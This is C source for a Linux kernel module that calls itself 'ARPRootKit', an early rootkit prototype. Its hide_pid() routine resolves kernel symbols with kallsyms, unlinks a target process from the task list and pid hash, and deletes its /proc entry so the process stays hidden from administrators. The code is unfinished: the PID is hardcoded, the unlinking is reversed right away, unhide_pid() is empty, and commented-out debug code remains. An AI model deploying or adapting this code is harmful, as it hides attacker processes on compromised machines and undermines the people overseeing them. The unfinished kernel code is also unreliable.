/*
 * ARPRootKit v1.0, a simple rootkit for the Linux Kernel.
 * 
 * Copyright 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <linux/namei.h>
#include <linux/proc_fs.h>
#include <linux/pid_namespace.h>
#include <linux/kallsyms.h>
#include <linux/rculist.h>
#include <linux/hash.h>
#include <linux/sched/signal.h>
#include <linux/module.h>       /* Needed by all modules */
#include <linux/kernel.h>       /* Needed for KERN_INFO */
#include <linux/init.h>         /* Needed for the macros */

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Abel Romero Pérez aka D1W0U <abel@abelromero.com>");
MODULE_DESCRIPTION("A simple Linux Kernel Module RootKit");
MODULE_SUPPORTED_DEVICE("testdevice");

#define pid_hashfn(nr, ns)  \
    hash_long((unsigned long)nr + (unsigned long)ns, pidhash_shift)
struct hlist_head *pid_hash = NULL;
unsigned int pidhash_shift = 0;

int hide_pid(pid_t pid);
int unhide_pid(pid_t pid);

static int __init init_hello_4(void)
{
    pr_info("Hello, world 4\n");

	pid_hash = (struct hlist_head *) *((struct hlist_head **) kallsyms_lookup_name("pid_hash"));
	pidhash_shift = (unsigned int) *((unsigned int *) kallsyms_lookup_name("pidhash_shift"));

	if (pid_hash == NULL || pidhash_shift == 0) {
		printk("ERROR: pid_hash = %p, pidhash_shift = %d\n", pid_hash, pidhash_shift);
		return -1;
	}

	printk("pid_hash = %p, pidhash_shift = %d\n", pid_hash, pidhash_shift);

	hide_pid(10);

	return 0;
}

static void __exit cleanup_hello_4(void)
{
    pr_info("Goodbye, world 4\n");
}

int hide_pid(pid_t nr) {
//    struct task_struct *task;
//    for_each_process(task) {
//        printk("%d %p: next = %p, prev = %p\n", task->pid, task, list_entry_rcu(task->tasks.next, struct task_struct, tasks), list_entry_rcu(task->tasks.prev, struct task_struct, tasks));
//        if (task->pid == nr) {
            //task->tasks.next->prev = task->tasks.prev;
            //task->tasks.prev->next = task->tasks.next;

			struct pid_namespace *ns = task_active_pid_ns(current);
		    struct upid *pnr;
			printk("ns %p\n", ns);
			printk("nr %d\n", nr);
/*
#define hlist_for_each_entry_rcu(pos, head, member)         \
    for (pos = hlist_entry_safe (rcu_dereference_raw(hlist_first_rcu(head)),\
            typeof(*(pos)), member);            \
        pos;                            \
        pos = hlist_entry_safe(rcu_dereference_raw(hlist_next_rcu(\
            &(pos)->member)), typeof(*(pos)), member))

		    hlist_for_each_entry_rcu(pnr, &pid_hash[pid_hashfn(nr, ns)], pid_chain)
				if (pnr->nr == nr && pnr->ns == ns)
            		return container_of(pnr, struct pid, numbers[ns->level]);
*/
			struct hlist_head *head;
			struct hlist_node *node;
			head = &pid_hash[pid_hashfn(nr, ns)];
			node = hlist_first_rcu(head);
			pnr = hlist_entry_safe(rcu_dereference_raw(node), typeof(*(pnr)), pid_chain);
			if (pnr) {
				printk("%d\n", pnr->nr);
				if (pnr->nr == nr && pnr->ns == ns) {
					printk("found pid %d\n", nr);
					struct pid *pid = container_of(pnr, struct pid, numbers[ns->level]);
					struct task_struct *task = get_pid_task(pid, PIDTYPE_PID);
					if (task != NULL) {
						printk("task = %p\n", task);
						struct list_head *task_next, *task_prev;
						task_prev = task->tasks.next->prev;
						task_next = task->tasks.prev->next;
						task->tasks.next->prev = task->tasks.prev;
			            task->tasks.prev->next = task->tasks.next;
						hlist_del_rcu(node);
						char path_name[50];
						snprintf(path_name, sizeof(path_name), "/proc/%d", nr);
						struct path path;
						kern_path(path_name, LOOKUP_FOLLOW, &path);
						d_delete(path.dentry);
						d_rehash(path.dentry);
						hlist_add_head_rcu(node, &pid_hash[pid_hashfn(nr, ns)]);
						task->tasks.next->prev = task_prev;
						task->tasks.prev->next = task_next;

						printk("find_vpid %p\n", find_vpid(nr));
						
						return 0;
					}
				}
			}

			// unhide
/*			task->tasks.next->prev = (struct list_head *) task;
			task->tasks.prev->next = (struct list_head *) task;
			for (i = 0; i <= pid->level; i++) {
				struct upid *upid = pid->numbers + i;
				hlist_add_head_rcu(&upid->pid_chain, &pid_hash[pid_hashfn(upid->nr, upid->ns)]);
			}
*/
//        }
//    }

	return -1;
}

// based on https://stackoverflow.com/questions/27862132/inserting-a-pid-in-the-linux-hash-table/48225561#48225561
int unhide_pid(pid_t pid) {
	
}

module_init(init_hello_4);
module_exit(cleanup_hello_4);
